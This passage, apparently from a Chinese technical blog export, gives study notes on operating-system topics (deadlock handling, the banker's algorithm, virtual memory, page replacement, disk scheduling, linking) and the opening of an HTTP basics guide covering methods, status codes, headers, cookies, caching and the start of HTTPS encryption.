因为解决死锁问题的代价很高，因此鸵鸟策略这种不采取任务措施的方案会获得更高的性能。当发生死锁时不会对用户造成多大影响，或发生死锁的概率很低，可以采用鸵鸟策略。 大多数操作系统，包括 Unix，Linux 和 Windows，处理死锁问题的办法仅仅是忽略它。 2. 死锁检测与死锁恢复不试图阻止死锁，而是当检测到死锁发生时，采取措施进行恢复。 （一）每种类型一个资源的死锁检测 上图为资源分配图，其中方框表示资源，圆圈表示进程。资源指向进程表示该资源已经分配给该进程，进程指向资源表示进程请求获取该资源。 图 a 可以抽取出环，如图 b，它满足了环路等待条件，因此会发生死锁。 每种类型一个资源的死锁检测算法是通过检测有向图是否存在环来实现，从一个节点出发进行深度优先搜索，对访问过的节点进行标记，如果访问了已经标记的节点，就表示有向图存在环，也就是检测到死锁的发生。 （二）每种类型多个资源的死锁检测 上图中，有三个进程四个资源，每个数据代表的含义如下： E 向量：资源总量 A 向量：资源剩余量 C 矩阵：每个进程所拥有的资源数量，每一行都代表一个进程拥有资源的数量 R 矩阵：每个进程请求的资源数量 进程 P1 和 P2 所请求的资源都得不到满足，只有进程 P3 可以，让 P3 执行，之后释放 P3 拥有的资源，此时 A = (2 2 2 0)。P2 可以执行，执行后释放 P2 拥有的资源，A = (4 2 2 1) 。P1 也可以执行。所有进程都可以顺利执行，没有死锁。 算法总结如下： 每个进程最开始时都不被标记，执行过程有可能被标记。当算法结束时，任何没有被标记的进程都是死锁进程。 寻找一个没有标记的进程 Pi，它所请求的资源小于等于 A。 如果找到了这样一个进程，那么将 C 矩阵的第 i 行向量加到 A 中，标记该进程，并转回 1。 如果没有这样一个进程，算法终止。 （三）死锁恢复 利用抢占恢复 利用回滚恢复 通过杀死进程恢复 3. 死锁预防在程序运行之前预防发生死锁。 （一）破坏互斥条件 例如假脱机打印机技术允许若干个进程同时输出，唯一真正请求物理打印机的进程是打印机守护进程。 （二）破坏占有和等待条件 一种实现方式是规定所有进程在开始执行前请求所需要的全部资源。 （三）破坏不可抢占条件 （四）破坏环路等待 给资源统一编号，进程只能按编号顺序来请求资源。 4. 死锁避免在程序运行时避免发生死锁。 （一）安全状态 图 a 的第二列 Has 表示已拥有的资源数，第三列 Max 表示总共需要的资源数，Free 表示还有可以使用的资源数。从图 a 开始出发，先让 B 拥有所需的所有资源（图 b），运行结束后释放 B，此时 Free 变为 5（图 c）；接着以同样的方式运行 C 和 A，使得所有进程都能成功运行，因此可以称图 a 所示的状态时安全的。 定义：如果没有死锁发生，并且即使所有进程突然请求对资源的最大需求，也仍然存在某种调度次序能够使得每一个进程运行完毕，则称该状态是安全的。 安全状态的检测与死锁的检测类似，因为安全状态必须要求不能发生死锁。下面的银行家算法与死锁检测算法非常类似，可以结合着做参考对比。 （二）单个资源的银行家算法 一个小城镇的银行家，他向一群客户分别承诺了一定的贷款额度，算法要做的是判断对请求的满足是否会进入不安全状态，如果是，就拒绝请求；否则予以分配。 上图 c 为不安全状态，因此算法会拒绝之前的请求，从而避免进入图 c 中的状态。 （三）多个资源的银行家算法 上图中有五个进程，四个资源。左边的图表示已经分配的资源，右边的图表示还需要分配的资源。最右边的 E、P 以及 A 分别表示：总资源、已分配资源以及可用资源，注意这三个为向量，而不是具体数值，例如 A=(1020)，表示 4 个资源分别还剩下 1/0/2/0。 检查一个状态是否安全的算法如下： 查找右边的矩阵是否存在一行小于等于向量 A。如果不存在这样的行，那么系统将会发生死锁，状态是不安全的。 假若找到这样一行，将该进程标记为终止，并将其已分配资源加到 A 中。 重复以上两步，直到所有进程都标记为终止，则状态时安全的。 如果一个状态不是安全的，也需要拒绝进入这个状态。 四、内存管理虚拟内存每个程序拥有自己的地址空间，这个地址空间被分割成多个块，每一块称为一页。这些页被映射到物理内存，但不需要映射到连续的物理内存，也不需要所有页都必须在物理内存中。当程序引用到一部分不在物理内存中的地址空间时，由硬件执行必要的映射，将缺失的部分装入物理内存并重新执行失败的指令。 分页与分段1. 分页大部分虚拟内存系统都使用分页技术。把由程序产生的地址称为虚拟地址，它们构成了一个虚拟地址空间。例如有一台计算机可以产生 16 位地址，它的虚拟地址空间为 0~64K，然而计算机只有 32KB 的物理内存，因此虽然可以编写 64KB 的程序，但它们不能被完全调入内存运行。 虚拟地址空间划分成固定大小的页，在物理内存中对应的单元称为页框，页和页框大小通常相同，它们之间通过页表进行映射。 程序最开始只将一部分页调入页框中，当程序引用到没有在页框的页时，产生缺页中断，进行页面置换，按一定的原则将一部分页框换出，并将页调入。 2. 分段 上图为一个编译器在编译过程中建立的多个表，有 4 个表是动态增长的，如果使用分页系统的一维地址空间，动态增长的特点会导致覆盖问题的出现。 分段的做法是把每个表分成段，一个段构成一个独立的地址空间。每个段的长度可以不同，并且可以动态增长。 每个段都需要程序员来划分。 3. 段页式用分段方法来分配和管理虚拟存储器。程序的地址空间按逻辑单位分成基本独立的段，而每一段有自己的段名，再把每段分成固定大小的若干页。 用分页方法来分配和管理实存。即把整个主存分成与上述页大小相等的存储块，可装入作业的任何一页。 程序对内存的调入或调出是按页进行的，但它又可按段实现共享和保护。 4. 分页与分段区别 对程序员的透明性：分页透明，但是分段需要程序员显示划分每个段。 地址空间的维度：分页是一维地址空间，分段是二维的。 大小是否可以改变：页的大小不可变，段的大小可以动态改变。 出现的原因：分页主要用于实现虚拟内存，从而获得更大的地址空间；分段主要是为了使程序和数据可以被划分为逻辑上独立的地址空间并且有助于共享和保护。 分页系统地址映射 内存管理单元（MMU）：管理着虚拟地址空间和物理内存的转换。 页表（Page table）：页（虚拟地址空间）和页框（物理内存空间）的映射表。例如下图中，页表的第 0 个表项为 010，表示第 0 个页映射到第 2 个页框。页表项的最后一位用来标记页是否在内存中。 下图的页表存放着 16 个页，这 16 个页需要用 4 个比特位来进行索引定位。因此对于虚拟地址（0010 000000000100），前 4 位是用来存储页面号，而后 12 位存储在页中的偏移量。 （0010 000000000100）根据前 4 位得到页号为 2，读取表项内容为（110 1），它的前 3 为为页框号，最后 1 位表示该页在内存中。最后映射得到物理内存地址为（110 000000000100）。 页面置换算法在程序运行过程中，如果要访问的页面不在内存中，就发生缺页中断从而将该页调入内存中。此时如果内存已无空闲空间，系统必须从内存中调出一个页面到磁盘对换区中来腾出空间。 页面置换算法的主要目标是使页面置换频率最低（也可以说缺页率最低）。 1. 最佳 Optimal 所选择的被换出的页面将是最长时间内不再被访问，通常可以保证获得最低的缺页率。 是一种理论上的算法，因为无法知道一个页面多长时间不再被访问。 举例：一个系统为某进程分配了三个物理块，并有如下页面引用序列： 开始运行时，先将 7, 0, 1 三个页面装入内存。当进程要访问页面 2 时，产生缺页中断，会将页面 7 换出，因为页面 7 再次被访问的时间最长。 2. 先进先出 FIFO, First In First Out 所选择换出的页面是最先进入的页面。 该算法会将那些经常被访问的页面也被换出，从而使缺页率升高。 3. 最近最久未使用 LRU, Least Recently Used 虽然无法知道将来要使用的页面情况，但是可以知道过去使用页面的情况。LRU 将最近最久未使用的页面换出。 可以用栈来实现该算法，栈中存储页面的页面号。当进程访问一个页面时，将该页面的页面号从栈移除，并将它压入栈顶。这样，最近被访问的页面总是在栈顶，而最近最久未使用的页面总是在栈底。 4. 时钟 Clock 需要用到一个访问位，当一个页面被访问时，将访问位置为 1。 首先，将内存中的所有页面链接成一个循环队列，当缺页中断发生时，检查当前指针所指向页面的访问位，如果访问位为 0，就将该页面换出；否则将该页的访问位设置为 0，给该页面第二次的机会，移动指针继续检查。 五、设备管理磁盘调度算法当多个进程同时请求访问磁盘时，需要进行磁盘调度来控制对磁盘的访问。 磁盘调度的主要目标是使磁盘的平均寻道时间最少。 1. 先来先服务 FCFS, First Come First Served 根据进程请求访问磁盘的先后次序来进行调度。优点是公平和简单，缺点也很明显，因为未对寻道做任何优化，使平均寻道时间可能较长。 2. 最短寻道时间优先 SSTF, Shortest Seek Time First 要求访问的磁道与当前磁头所在磁道距离最近的优先进行调度。这种算法并不能保证平均寻道时间最短，但是比 FCFS 好很多。 3. 扫描算法 SCAN SSTF 会出现饥饿现象。考虑以下情况，新进程请求访问的磁道与磁头所在磁道的距离总是比一个在等待的进程来的近，那么等待的进程会一直等待下去。 SCAN 算法在 SSTF 算法之上考虑了磁头的移动方向，要求所请求访问的磁道在磁头当前移动方向上才能够得到调度。因为考虑了移动方向，那么一个进程请求访问的磁道一定会得到调度。 当一个磁头自里向外移动时，移到最外侧会改变移动方向为自外向里，这种移动的规律类似于电梯的运行，因此又常称 SCAN 算法为电梯调度算法。 4. 循环扫描算法 CSCAN CSCAN 对 SCAN 进行了改动，要求磁头始终沿着一个方向移动。 六、链接编译系统以下是一个 hello.c 程序： 1234567#include &lt;stdio.h&gt;int main()&#123; printf("hello, world\n"); return 0;&#125; 在 Unix 系统上，由编译器把源文件转换为目标文件。 1gcc -o hello hello.c 这个过程大致如下： 预处理阶段：处理以 # 开头的预处理命令； 编译阶段：翻译成汇编程序； 汇编阶段：将汇编程序翻译可重定向目标程序，它是二进制的； 链接阶段：将可重定向目标程序和 printf.o 等单独预编译好的目标文件进行合并，得到最终的可执行目标程序。 目标文件 可执行目标文件：可以直接在内存中执行； 可重定向目标文件：可与其他可重定向目标文件在链接阶段合并，创建一个可执行目标文件； 共享目标文件：可以在运行时被动态加载进内存并链接； 静态链接静态连接器以一组可重定向目标文件为输入，生成一个完全链接的可执行目标文件作为输出。链接器主要完成以下两个任务： 符号解析：每个符号对应于一个函数、一个全局变量或一个静态变量，符号解析的目的是将每个符号引用与一个符号定义关联起来。 重定位：编译器和汇编器生成从地址 0 开始的代码和数据节，链接器通过把每个符号定义与一个内存位置关联起来，从而重定位这些节，然后修改所有对这些符号的引用，使得它们指向这个内存位置。 动态链接静态库有以下两个问题： 当静态库更新时那么整个程序都要重新进行链接； 对于 printf 这种标准函数库，如果每个程序都要有代码，这会极大浪费资源。 共享库是为了解决静态库的这两个问题而设计的，在 Linux 系统中通常用 .so 后缀来表示，Windows 系统上它们被称为 DLL。它具有以下特点： 在给定的文件系统中一个库只有一个 .so 文件，所有引用该库的可执行目标文件都共享这个文件，它不会被复制到引用它的可执行文件中； 在内存中，一个共享库的 .text 节的一个副本可以被不同的正在运行的进程共享。 参考资料 Tanenbaum A S, Bos H. Modern operating systems[M]. Prentice Hall Press, 2014. 汤子瀛, 哲凤屏, 汤小丹. 计算机操作系统[M]. 西安电子科技大学出版社, 2001. Bryant, R. E., &amp; O’Hallaron, D. R. (2004). 深入理解计算机系统. Operating System Notes 进程间的几种通信方式 Operating-System Structures Processes Inter Process Communication Presentation[1]]]></content>
      <categories>
        <category>系统运维</category>
      </categories>
      <tags>
        <tag>ops</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[HTTP协议基础知识]]></title>
    <url>%2Flinux_ops%2Fhttp%2F</url>
    <content type="text"><![CDATA[一 、基础概念 Web 基础 URL 请求和响应报文 二、HTTP 方法 GET HEAD POST PUT PATCH DELETE OPTIONS CONNECT TRACE 三、HTTP 状态码 1XX 信息 2XX 成功 3XX 重定向 4XX 客户端错误 5XX 服务器错误 四、HTTP 首部 通用首部字段 请求首部字段 响应首部字段 实体首部字段 五、具体应用 Cookie 缓存 连接管理 内容协商 内容编码 范围请求 分块传输编码 多部分对象集合 虚拟主机 通信数据转发 六、HTTPs 加密 认证 完整性保护 HTTPs 的缺点 配置 HTTPs 七、Web 攻击技术 跨站脚本攻击 跨站点请求伪造 SQL 注入攻击 拒绝服务攻击 八、GET 和 POST 的区别 作用 参数 安全 幂等性 可缓存 XMLHttpRequest 九、HTTP/1.0 与 HTTP/1.1 的区别 十、HTTP/2.0 HTTP/1.x 缺陷 二进制分帧层 服务端推送 首部压缩 参考资料 一 、基础概念Web 基础 WWW（World Wide Web）的三种技术：HTML、HTTP、URL HTML（HyperText Markup Language，超文本标记语言） HTTP（HyperText Transfer Protocol，超文本传输协议） RFC（Request for Comments，征求修正意见书），互联网的设计文档。 URL URI（Uniform Resource Indentifier，统一资源标识符） URL（Uniform Resource Locator，统一资源定位符） URN（Uniform Resource Name，统一资源名称），例如 urn:isbn:0-486-27557-4。 URI 包含 URL 和 URN，目前 WEB 只有 URL 比较流行，所以见到的基本都是 URL。 请求和响应报文1. 请求报文 2. 响应报文 二、HTTP 方法客户端发送的 请求报文 第一行为请求行，包含了方法字段。 GET 获取资源 当前网络请求中，绝大部分使用的是 GET 方法。 HEAD 获取报文首部 和 GET 方法一样，但是不返回报文实体主体部分。 主要用于确认 URL 的有效性以及资源更新的日期时间等。 POST 传输实体主体 POST 主要用来传输数据，而 GET 主要用来获取资源。 更多 POST 与 GET 的比较请见第八章。 PUT 上传文件 由于自身不带验证机制，任何人都可以上传文件，因此存在安全性问题，一般不使用该方法。 123456PUT /new.html HTTP/1.1Host: example.comContent-type: text/htmlContent-length: 16&lt;p&gt;New File&lt;/p&gt; PATCH 对资源进行部分修改 PUT 也可以用于修改资源，但是只能完全替代原始资源，PATCH 允许部分修改。 1234567PATCH /file.txt HTTP/1.1Host: www.example.comContent-Type: application/exampleIf-Match: "e0023aa4e"Content-Length: 100[description of changes] DELETE 删除文件 与 PUT 功能相反，并且同样不带验证机制。 1DELETE /file.html HTTP/1.1 OPTIONS 查询支持的方法 查询指定的 URL 能够支持的方法。 会返回 Allow: GET, POST, HEAD, OPTIONS 这样的内容。 CONNECT 要求用隧道协议连接代理 要求在与代理服务器通信时建立隧道，使用 SSL（Secure Sockets Layer，安全套接层）和 TLS（Transport Layer Security，传输层安全）协议把通信内容加密后经网络隧道传输。 1CONNECT www.example.com:443 HTTP/1.1 TRACE 追踪路径 服务器会将通信路径返回给客户端。 发送请求时，在 Max-Forwards 首部字段中填入数值，每经过一个服务器就会减 1，当数值为 0 时就停止传输。 通常不会使用 TRACE，并且它容易受到 XST 攻击（Cross-Site Tracing，跨站追踪），因此更不会去使用它。 三、HTTP 状态码服务器返回的 响应报文 中第一行为状态行，包含了状态码以及原因短语，用来告知客户端请求的结果。 状态码 类别 原因短语 1XX Informational（信息性状态码） 接收的请求正在处理 2XX Success（成功状态码） 请求正常处理完毕 3XX Redirection（重定向状态码） 需要进行附加操作以完成请求 4XX Client Error（客户端错误状态码） 服务器无法处理请求 5XX Server Error（服务器错误状态码） 服务器处理请求出错 1XX 信息 100 Continue ：表明到目前为止都很正常，客户端可以继续发送请求或者忽略这个响应。 2XX 成功 200 OK 204 No Content ：请求已经成功处理，但是返回的响应报文不包含实体的主体部分。一般在只需要从客户端往服务器发送信息，而不需要返回数据时使用。 206 Partial Content ：表示客户端进行了范围请求。响应报文包含由 Content-Range 指定范围的实体内容。 3XX 重定向 301 Moved Permanently ：永久性重定向 302 Found ：临时性重定向 303 See Other ：和 302 有着相同的功能，但是 303 明确要求客户端应该采用 GET 方法获取资源。 注：虽然 HTTP 协议规定 301、302 状态下重定向时不允许把 POST 方法改成 GET 方法，但是大多数浏览器都会在 301、302 和 303 状态下的重定向把 POST 方法改成 GET 方法。 304 Not Modified ：如果请求报文首部包含一些条件，例如：If-Match，If-ModifiedSince，If-None-Match，If-Range，If-Unmodified-Since，如果不满足条件，则服务器会返回 304 状态码。 307 Temporary Redirect ：临时重定向，与 302 的含义类似，但是 307 要求浏览器不会把重定向请求的 POST 方法改成 GET 方法。 4XX 客户端错误 400 Bad Request ：请求报文中存在语法错误。 401 Unauthorized ：该状态码表示发送的请求需要有认证信息（BASIC 认证、DIGEST 认证）。如果之前已进行过一次请求，则表示用户认证失败。 403 Forbidden ：请求被拒绝，服务器端没有必要给出拒绝的详细理由。 404 Not Found 5XX 服务器错误 500 Internal Server Error ：服务器正在执行请求时发生错误。 502 Bad Gateway ：是指错误网关，无效网关；在互联网中表示一种网络错误。 503 Service Unavilable ：服务器暂时处于超负载或正在进行停机维护，现在无法处理请求。 四、HTTP 首部有 4 种类型的首部字段：通用首部字段、请求首部字段、响应首部字段和实体首部字段。 各种首部字段及其含义如下（不需要全记，仅供查阅）： 通用首部字段 首部字段名 说明 Cache-Control 控制缓存的行为 Connection 控制不再转发给代理的首部字段、管理持久连接 Date 创建报文的日期时间 Pragma 报文指令 Trailer 报文末端的首部一览 Transfer-Encoding 指定报文主体的传输编码方式 Upgrade 升级为其他协议 Via 代理服务器的相关信息 Warning 错误通知 请求首部字段 首部字段名 说明 Accept 用户代理可处理的媒体类型 Accept-Charset 优先的字符集 Accept-Encoding 优先的内容编码 Accept-Language 优先的语言（自然语言） Authorization Web 认证信息 Expect 期待服务器的特定行为 From 用户的电子邮箱地址 Host 请求资源所在服务器 If-Match 比较实体标记（ETag） If-Modified-Since 比较资源的更新时间 If-None-Match 比较实体标记（与 If-Match 相反） If-Range 资源未更新时发送实体 Byte 的范围请求 If-Unmodified-Since 比较资源的更新时间（与 If-Modified-Since 相反） Max-Forwards 最大传输逐跳数 Proxy-Authorization 代理服务器要求客户端的认证信息 Range 实体的字节范围请求 Referer 对请求中 URI 的原始获取方 TE 传输编码的优先级 User-Agent HTTP 客户端程序的信息 响应首部字段 首部字段名 说明 Accept-Ranges 是否接受字节范围请求 Age 推算资源创建经过时间 ETag 资源的匹配信息 Location 令客户端重定向至指定 URI Proxy-Authenticate 代理服务器对客户端的认证信息 Retry-After 对再次发起请求的时机要求 Server HTTP 服务器的安装信息 Vary 代理服务器缓存的管理信息 WWW-Authenticate 服务器对客户端的认证信息 实体首部字段 首部字段名 说明 Allow 资源可支持的 HTTP 方法 Content-Encoding 实体主体适用的编码方式 Content-Language 实体主体的自然语言 Content-Length 实体主体的大小 Content-Location 替代对应资源的 URI Content-MD5 实体主体的报文摘要 Content-Range 实体主体的位置范围 Content-Type 实体主体的媒体类型 Expires 实体主体过期的日期时间 Last-Modified 资源的最后修改日期时间 五、具体应用CookieHTTP 协议是无状态的，主要是为了让 HTTP 协议尽可能简单，使得它能够处理大量事务。HTTP/1.1 引入 Cookie 来保存状态信息。 Cookie 是服务器发送到用户浏览器并保存在本地的一小块数据，它会在浏览器下次向同一服务器再发起请求时被携带并发送到服务器上。通常，它用于告知服务端两个请求是否来自同一浏览器，如保持用户的登录状态。 1. 用途 会话状态管理（如用户登录状态、购物车、游戏分数或其它需要记录的信息） 个性化设置（如用户自定义设置、主题等） 浏览器行为跟踪（如跟踪分析用户行为等） Cookie 曾一度用于客户端数据的存储，因当时并没有其它合适的存储办法而作为唯一的存储手段，但现在随着现代浏览器开始支持各种各样的存储方式，Cookie 渐渐被淘汰。由于服务器指定 Cookie 后，浏览器的每次请求都会携带 Cookie 数据，会带来额外的性能开销（尤其是在移动环境下）。新的浏览器 API 已经允许开发者直接将数据存储到本地，如使用 Web storage API （本地存储和会话存储）或 IndexedDB。 2. 创建过程服务器发送的响应报文包含 Set-Cookie 首部字段，客户端得到响应报文后把 Cookie 内容保存到浏览器中。 123456HTTP/1.0 200 OKContent-type: text/htmlSet-Cookie: yummy_cookie=chocoSet-Cookie: tasty_cookie=strawberry[page content] 客户端之后对同一个服务器发送请求时，会从浏览器中读出 Cookie 信息通过 Cookie 请求首部字段发送给服务器。 123GET /sample_page.html HTTP/1.1Host: www.example.orgCookie: yummy_cookie=choco; tasty_cookie=strawberry 3. 分类 会话期 Cookie：浏览器关闭之后它会被自动删除，也就是说它仅在会话期内有效。 持久性 Cookie：指定一个特定的过期时间（Expires）或有效期（Max-Age）之后就成为了持久性的 Cookie。 1Set-Cookie: id=a3fWa; Expires=Wed, 21 Oct 2015 07:28:00 GMT; 4. JavaScript 获取 Cookie通过 Document.cookie 属性可创建新的 Cookie，也可通过该属性访问非 HttpOnly 标记的 Cookie。 123document.cookie = "yummy_cookie=choco";document.cookie = "tasty_cookie=strawberry";console.log(document.cookie); 5. Secure 和 HttpOnly标记为 Secure 的 Cookie 只应通过被 HTTPS 协议加密过的请求发送给服务端。但即便设置了 Secure 标记，敏感信息也不应该通过 Cookie 传输，因为 Cookie 有其固有的不安全性，Secure 标记也无法提供确实的安全保障。 标记为 HttpOnly 的 Cookie 不能被 JavaScript 脚本调用。因为跨域脚本 (XSS) 攻击常常使用 JavaScript 的 Document.cookie API 窃取用户的 Cookie 信息，因此使用 HttpOnly 标记可以在一定程度上避免 XSS 攻击。 1Set-Cookie: id=a3fWa; Expires=Wed, 21 Oct 2015 07:28:00 GMT; Secure; HttpOnly 6. 作用域Domain 标识指定了哪些主机可以接受 Cookie。如果不指定，默认为当前文档的主机（不包含子域名）。如果指定了 Domain，则一般包含子域名。例如，如果设置 Domain=mozilla.org，则 Cookie 也包含在子域名中（如 developer.mozilla.org）。 Path 标识指定了主机下的哪些路径可以接受 Cookie（该 URL 路径必须存在于请求 URL 中）。以字符 %x2F (“/“) 作为路径分隔符，子路径也会被匹配。例如，设置 Path=/docs，则以下地址都会匹配： /docs /docs/Web/ /docs/Web/HTTP 7. Session除了可以将用户信息通过 Cookie 存储在用户浏览器中，也可以利用 Session 存储在服务器端，存储在服务器端的信息更加安全。 Session 可以存储在服务器上的文件、数据库或者内存中，现在最常见的是将 Session 存储在内存型数据库中，比如 Redis。 使用 Session 维护用户登录的过程如下： 用户进行登录时，用户提交包含用户名和密码的表单，放入 HTTP 请求报文中； 服务器验证该用户名和密码； 如果正确则把用户信息存储到 Redis 中，它在 Redis 中的 ID 称为 Session ID； 服务器返回的响应报文的 Set-Cookie 首部字段包含了这个 Session ID，客户端收到响应报文之后将该 Cookie 值存入浏览器中； 客户端之后对同一个服务器进行请求时会包含该 Cookie 值，服务器收到之后提取出 Session ID，从 Redis 中取出用户信息，继续之后的业务操作。 应该注意 Session ID 的安全性问题，不能让它被恶意攻击者轻易获取，那么就不能生产一个容易被才到的 Session ID 值。此外，还需要经常重新生成 Session ID。在对安全性要求极高的场景下，例如转账等操作，除了使用 Session 管理用户状态之外，还需要对用户进行重新验证，比如重新输入密码，或者使用短信验证码等方式。 8. 浏览器禁用 Cookie此时无法使用 Cookie 来保存用户信息，只能使用 Session。除此之外，不能再将 Session ID 存放到 Cookie 中，而是使用 URL 重写技术，将 Session ID 作为 URL 的参数进行传递。 9. Cookie 与 Session 选择 Cookie 只能存储 ASCII 码字符串，而 Session 则可以存取任何类型的数据，因此在考虑数据复杂性时 首选 Session； Cookie 存储在浏览器中，容易被恶意查看。如果非要将一些隐私数据存在 Cookie 中，可以将 Cookie 值进行加密，然后在服务器进行解密； 对于大型网站，如果用户所有的信息都存储在 Session 中，那么开销是非常大的，因此不建议将所有的用户信息都存储到 Session 中。 缓存1. 优点 缓解服务器压力； 减低客户端获取资源的延迟（缓存资源比服务器上的资源离客户端更近）。 2. 实现方法 让代理服务器进行缓存； 让客户端浏览器进行缓存。 3. Cache-ControlHTTP/1.1 通过 Cache-Control 首部字段来控制缓存。 （一）禁止进行缓存 no-store 指令规定不能对请求或响应的任何一部分进行缓存。 1Cache-Control: no-store （二）强制确认缓存 no-cache 指令规定缓存服务器需要先向源服务器验证缓存资源的有效性，只有当缓存资源有效才将能使用该缓存对客户端的请求进行响应。 1Cache-Control: no-cache （三）私有缓存和公共缓存 private 指定规定了可以将资源作为私有缓存，只能被单独用户所使用，一般存储在用户浏览器中。 1Cache-Control: private public 指令规定了可以将资源作为公共缓存，可以被多个用户所使用，一般存在在代理服务器中。 1Cache-Control: public （四）缓存过期机制 max-age 指令出现在请求报文中，并且缓存资源的缓存时间小于该指令指定的时间，那么就能接受该缓存。 max-age 指令出现在响应报文中，表示缓存资源在缓存服务器中保存的时间。 1Cache-Control: max-age=31536000 Expires 字段也可以用于告知缓存服务器该资源什么时候会过期。在 HTTP/1.1 中，会优先处理 Cache-Control : max-age 指令；而在 HTTP/1.0 中，Cache-Control : max-age 指令会被忽略掉。 1Expires: Wed, 04 Jul 2012 08:26:05 GMT 4. 缓存验证需要先了解 ETag 首部字段的含义，它是资源的唯一表示。URL 不能唯一表示资源，例如 http://www.google.com/ 有中文和英文两个资源，只有 ETag 才能对这两个资源进行唯一表示。 1ETag: "82e22293907ce725faf67773957acd12" 可以将缓存资源的 ETag 值放入 If-None-Match 首部，服务器收到该请求后，判断缓存资源的 ETag 值和资源的最新 ETag 值是否一致，如果一致则表示缓存资源有效，返回 304 Not Modified。 1If-None-Match: "82e22293907ce725faf67773957acd12" Last-Modified 首部字段也可以用于缓存验证，它包含在源服务器发送的响应报文中，指示源服务器对资源的最后修改时间。但是它是一种弱校验器，因为只能精确到一秒，所以它通常作为 ETag 的备用方案。 如果响应首部字段里含有这个信息，客户端可以在后续的请求中带上 If-Modified-Since 来验证缓存。服务器只在所请求的资源在给定的日期时间之后对内容进行过修改的情况下才会将资源返回，状态码为 200 OK。如果请求的资源从那时起未经修改，那么返回一个不带有消息主体的 304 Not Modified 响应， 1Last-Modified: Wed, 21 Oct 2015 07:28:00 GMT 1If-Modified-Since: Wed, 21 Oct 2015 07:28:00 GMT 连接管理 1. 短连接与长连接当浏览器访问一个包含多张图片的 HTML 页面时，除了请求访问 HTML 页面资源，还会请求图片资源，如果每进行一次 HTTP 通信就要断开一次 TCP 连接，连接建立和断开的开销会很大。长连接只需要建立一次 TCP 连接就能进行多次 HTTP 通信。 HTTP/1.1 开始默认是长连接的，如果要断开连接，需要由客户端或者服务器端提出断开，使用 Connection : close；而在 HTTP/1.1 之前默认是短连接的，如果需要长连接，则使用 Connection : Keep-Alive。 2. 流水线默认情况下，HTTP 请求是按顺序发出的，下一个请求只有在当前请求收到应答过后才会被发出。由于会受到网络延迟和带宽的限制，在下一个请求被发送到服务器之前，可能需要等待很长时间。流水线是在同一条长连接上发出连续的请求，而不用等待响应返回，这样可以避免连接延迟。 内容协商通过内容协商返回最合适的内容，例如根据浏览器的默认语言选择返回中文界面还是英文界面。 1. 类型（一）服务端驱动型内容协商 客户端设置特定的 HTTP 首部字段，例如 Accept、Accept-Charset、Accept-Encoding、Accept-Language、Content-Languag，服务器根据这些字段返回特定的资源。 它存在以下问题： 器对浏览器并非全知全能。即便是有了客户端示意扩展，也依然无法获取关于浏览器能力的全部信息。 端提供的信息相当冗长（HTTP/2 协议的首部压缩机制缓解了这个问题），并且存在隐私风险（HTTP 指纹识别技术）。 给定的资源需要返回不同的展现形式，共享缓存的效率会降低，而服务器端的实现会越来越复杂。 （二）代理驱动型协商 服务器返回 300 Multiple Choices 或者 406 Not Acceptable，客户端从中选出最合适的那个资源。 2. Vary1Vary: Accept-Language 在使用内容协商的情况下，只有当缓存服务器中的缓存满足内容协商条件时，才能使用该缓存，否则应该向源服务器请求该资源。 例如，一个客户端发送了一个包含 Accept-Language 首部字段的请求之后，源服务器返回的响应包含 Vary: Accept-Language 内容，缓存服务器对这个响应进行缓存之后，在客户端下一次访问同一个 URL 资源，并且 Accept-Language 与缓存中的对应的值相同时才会返回该缓存。 内容编码内容编码将实体主体进行压缩，从而减少传输的数据量。常用的内容编码有：gzip、compress、deflate、identity。 浏览器发送 Accept-Encoding 首部，其中包含有它所支持的压缩算法，以及各自的优先级，服务器则从中选择一种，使用该算法对响应的消息主体进行压缩，并且发送 Content-Encoding 首部来告知浏览器它选择了哪一种算法。由于该内容协商过程是基于编码类型来选择资源的展现形式的，在响应中， Vary 首部中至少要包含 Content-Encoding ；这样的话，缓存服务器就可以对资源的不同展现形式进行缓存。 范围请求如果网络出现中断，服务器只发送了一部分数据，范围请求可以使得客户端只请求未发送的那部分数据，从而避免服务器重新发送所有数据。 1. Range在请求报文中添加 Range 首部字段指定请求的范围。 123GET /z4d4kWk.jpg HTTP/1.1Host: i.imgur.comRange: bytes=0-1023 请求成功的话服务器返回的响应包含 206 Partial Content 状态码。 12345HTTP/1.1 206 Partial ContentContent-Range: bytes 0-1023/146515Content-Length: 1024...(binary content) 2. Accept-Ranges响应首部字段 Accept-Ranges 用于告知客户端是否能处理范围请求，可以处理使用 bytes，否则使用 none。 1Accept-Ranges: bytes 3. 响应 在请求成功的情况下，服务器会返回 206 Partial Content 状态码。 在请求的范围越界的情况下，服务器会返回 416 Requested Range Not Satisfiable 状态码。 在不支持范围请求的情况下，服务器会返回 200 OK 状态码。 分块传输编码Chunked Transfer Coding，可以把数据分割成多块，让浏览器逐步显示页面。 多部分对象集合一份报文主体内可含有多种类型的实体同时发送，每个部分之间用 boundary 字段定义的分隔符进行分隔，每个部分都可以有首部字段。 例如，上传多个表单时可以使用如下方式： 123456789101112Content-Type: multipart/form-data; boundary=AaB03x--AaB03xContent-Disposition: form-data; name="submit-name"Larry--AaB03xContent-Disposition: form-data; name="files"; filename="file1.txt"Content-Type: text/plain... contents of file1.txt ...--AaB03x-- 虚拟主机HTTP/1.1 使用虚拟主机技术，使得一台服务器拥有多个域名，并且在逻辑上可以看成多个服务器。 通信数据转发1. 代理代理服务器接受客户端的请求，并且转发给其它服务器。 使用代理的主要目的是：缓存、网络访问控制以及访问日志记录。 代理服务器分为正向代理和反向代理两种，用户察觉得到正向代理的存在，而反向代理一般位于内部网络中，用户察觉不到。 2. 网关与代理服务器不同的是，网关服务器会将 HTTP 转化为其它协议进行通信，从而请求其它非 HTTP 服务器的服务。 3. 隧道使用 SSL 等加密手段，为客户端和服务器之间建立一条安全的通信线路。 六、HTTPsHTTP 有以下安全性问题： 使用明文进行通信，内容可能会被窃听； 不验证通信方的身份，通信方的身份有可能遭遇伪装； 无法证明报文的完整性，报文有可能遭篡改。 HTTPs 并不是新协议，而是让 HTTP 先和 SSL（Secure Sockets Layer）通信，再由 SSL 和 TCP 通信。也就是说 HTTPs 使用了隧道进行通信。 通过使用 SSL，HTTPs 具有了加密（防窃听）、认证（防伪装）和完整性保护（防篡改）。 加密1. 对称密钥加密对称密钥加密（Symmetric-Key Encryption），加密的加密和解密使用同一密钥。 优点：运算速度快； 缺点：密钥容易被获取。 2. 公开密钥加密公开密钥加密（Public-Key 